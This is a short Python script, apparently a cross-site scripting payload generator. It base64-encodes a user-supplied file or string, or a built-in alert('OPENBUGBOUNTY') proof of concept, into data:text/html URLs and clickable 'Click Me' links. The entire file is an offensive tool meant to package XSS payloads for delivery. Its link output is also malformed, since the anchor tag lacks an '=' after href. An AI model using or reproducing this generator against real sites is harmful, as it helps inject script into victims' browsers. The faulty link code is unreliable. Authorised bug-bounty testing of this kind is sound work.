import base64
from  urllib.parse import quote as Escape
def splash():
    splash = """
     __   __ _____ _____   _____    __     ___      ____          _____     _____ ______ _   _ ______ _____         _______ ____  _____
     \ \ / // ____/ ____| |  __ \ /\\\\ \   / / |    / __ \   /\   |  __ \   / ____|  ____| \ | |  ____|  __ \     /\|__   __/ __ \|  __ \\
      \ V /| (___| (___   | |__) /  \\\\ \_/ /| |   | |  | | /  \  | |  | | | |  __| |__  |  \| | |__  | |__) |   /  \  | | | |  | | |__) |
       > <  \___ \\\___ \  |  ___/ /\ \\\\   / | |   | |  | |/ /\ \ | |  | | | | |_ |  __| | . ` |  __| |  _  /   / /\ \ | | | |  | |  _  /
      / . \ ____) |___) | | |  / ____ \| |  | |___| |__| / ____ \| |__| | | |__| | |____| |\  | |____| | \ \  / ____ \| | | |__| | | \ \\
     /_/ \_\_____/_____/  |_| /_/    \_\_|  |______\____/_/    \_\_____/   \_____|______|_| \_|______|_|  \_\/_/    \_\_|  \____/|_|  \_\\
     """
    print(splash)

def menu():
    menu=['File Payload generate','String Generate', 'PoC Payload']
    for num,choice in enumerate(menu):
        print('[{}] {}'.format(num+1,menu[num]))
    return int(input('XSS PAYLOAD>'))

def payload(choice):
    if choice == 1:
        print('File Payload')
        print('_'*40)
        path = input('Path of the xss file : ')
        try:
            string = open(path, 'r')
            string = string.read().encode('utf-8')
            b64String = Escape(base64.b64encode(string))
            output = open('output.txt', 'w')
            output.write('data:text/html;base64,{}'.format(b64String))
            print('Your Payload : output.txt')
        except FileNotFoundError:
            print("The File doesn't exist")

    if choice == 2:
        print('String Payload')
        print('_'*40)
        string = input('Type your payload>').encode('utf-8')
        b64String = Escape(base64.b64encode(string))
        print('Your Payload : data:text/html;base64,{}'.format(b64String))
        print('Click Me Payload : <a href "data:text/html;base64,{}">Click Me</a>'.format(b64String))
    if choice == 3:
        print('PoC Payload')
        print('_'*40)
        poc = "<script>alert('OPENBUGBOUNTY')</script>".encode('utf-8')
        b64String = Escape(base64.b64encode(poc))
        print('Your Payload : data:text/html;base64,{}'.format(b64String))
        print('Click Me Payload : <a href "data:text/html;base64,{}">Click Me</a>'.format(b64String))
splash()
payload(menu())
